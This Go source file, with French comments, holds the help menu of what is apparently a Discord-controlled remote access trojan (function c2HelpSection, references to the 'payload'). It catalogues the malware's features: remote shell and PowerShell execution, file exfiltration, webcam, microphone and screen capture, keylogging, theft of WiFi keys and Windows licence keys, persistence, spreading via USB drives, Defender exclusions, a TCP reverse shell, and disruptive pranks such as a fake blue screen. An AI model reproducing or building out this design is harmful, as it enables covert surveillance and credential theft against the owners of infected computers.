// help.go — aide par sections.
//
// Un seul pavé de 60 lignes était illisible dans Discord : on découpe en six
// sections, et `!help` sans argument n'affiche que le sommaire.
package main

import "strings"

// helpSections liste les sections et leur contenu.
var helpSections = map[string]string{
	"base": "```\n" +
		"!help [section]      cette aide (base, fichiers, capture, steal, systeme, reseau, fun)\n" +
		"!shell <cmd>         cmd.exe, sortie complète (.txt si longue)\n" +
		"!ps <cmd>            PowerShell, sortie complète\n" +
		"!ls [chemin]         liste un dossier\n" +
		"!cat <fichier>       affiche un texte\n" +
		"!apps [filtre]       applications ouvertes + chemins\n" +
		"!open <cible>        ouvre fichier/dossier/url\n" +
		"!close <pid|nom>     ferme la fenêtre\n" +
		"!kill <pid|nom>      tue le processus\n" +
		"!rm <chemin>         supprime fichier/dossier\n" +
		"!panel               tableau de bord + liens des salons\n" +
		"!status              état du payload\n" +
		"!menu                republie le bandeau à réactions\n" +
		"!salons              crée et vérifie les 12 salons\n" +
		"```",

	"fichiers": "```\n" +
		"!download <cible>    envoie fichier/dossier (zip auto)\n" +
		"!upload <url> <dest> télécharge depuis une URL\n" +
		"!exec <fichier> [a]  exécute un fichier local\n" +
		"!files               extraction massive (eval + PDF d'abord)\n" +
		"!search <motif> [n]  envoie les fichiers qui contiennent le motif\n" +
		"!images              toutes les images du poste\n" +
		"```",

	"capture": "```\n" +
		"!screenshot          capture, dans le salon de commande\n" +
		"!screenshot hd       agrandissement x3 (scale 1|2|3)\n" +
		"!screenshot <s> [m] [n]  série programmée (secondes)\n" +
		"!webcam              photo\n" +
		"!webcamrec <s>       vidéo AVI MJPEG (1-300 s)\n" +
		"!mic [s]             audio du microphone (WAV)\n" +
		"!keylog              journal clavier complet\n" +
		"!keylog on|off       flux 5 s dans -keylogs\n" +
		"!clip                presse-papiers\n" +
		"```",

	"steal": "```\n" +
		"!steal               extraction complète vers -steal\n" +
		"!wifi                profils WiFi et clés en clair\n" +
		"!licence             clés d'activation Windows\n" +
		"!localisation        position + adresse\n" +
		"!sysinfo             matériel, réseau, navigateurs\n" +
		"```",

	"systeme": "```\n" +
		"!persist on|off      démarrage avec Windows\n" +
		"!spread              duplique l'exe sur le poste et les clés USB\n" +
		"!defender            état Defender (exclude = exclusions, admin)\n" +
		"!elevate <cmd>       PowerShell en admin (UAC sur la machine)\n" +
		"!shutdown [r] [ts]   éteint ou redémarre (r = redémarre)\n" +
		"!delete confirm      SUPPRESSION TOTALE du payload\n" +
		"```",

	"reseau": "```\n" +
		"!shell_tcp <h> <p>   reverse shell TCP (cmd ou ps)\n" +
		"```",

	"fun": "```\n" +
		"!prank msg <texte>   boîte de dialogue\n" +
		"!prank wall <img>    fond d'écran\n" +
		"!prank url <lien>    ouvre une page\n" +
		"!prank speak <texte> synthèse vocale\n" +
		"!prank beep [n]      bips\n" +
		"!prank cd            ouvre le lecteur\n" +
		"!prank rotate [deg]  tourne l'écran (0 pour remettre)\n" +
		"!prank taskbar       masque la barre des tâches\n" +
		"!prank volume [n]    monte le son\n" +
		"!prank mute          coupe le son\n" +
		"!prank lock          verrouille la session\n" +
		"!prank swapmouse     inverse les boutons de souris\n" +
		"!prank bsod          faux écran bleu\n" +
		"!prank jiggle        agite la souris\n" +
		"!prank keyboard      bloque clavier et souris 10 s\n" +
		"```",
}

// helpIndex est le sommaire affiché par `!help`.
const helpIndex = "**Commandes** — `!help <section>`\n" +
	"```\n" +
	"base       shell, ps, ls, cat, apps, open, kill, panel, status, salons\n" +
	"fichiers   download, upload, exec, files, search, images\n" +
	"capture    screenshot, webcam, webcamrec, mic, keylog, clip\n" +
	"steal      steal, wifi, licence, localisation, sysinfo\n" +
	"systeme    persist, spread, defender, elevate, shutdown, delete\n" +
	"reseau     shell_tcp\n" +
	"fun        prank (15 effets)\n" +
	"```"

// c2HelpSection rend l'aide demandée.
func c2HelpSection(section string) string {
	s := strings.ToLower(strings.TrimSpace(section))
	s = strings.TrimPrefix(s, "!")
	if s == "" || s == "help" {
		return helpIndex
	}
	titles := map[string]string{
		"base": "Commandes de base", "fichiers": "Fichiers", "capture": "Captures et médias",
		"steal": "Extraction", "systeme": "Système", "reseau": "Réseau", "fun": "Blagues",
	}
	if txt, ok := helpSections[s]; ok {
		title := titles[s]
		if title == "" {
			title = s
		}
		return "**" + title + "**\n" + txt
	}
	return "section inconnue : `" + s + "`\n" + helpIndex
}
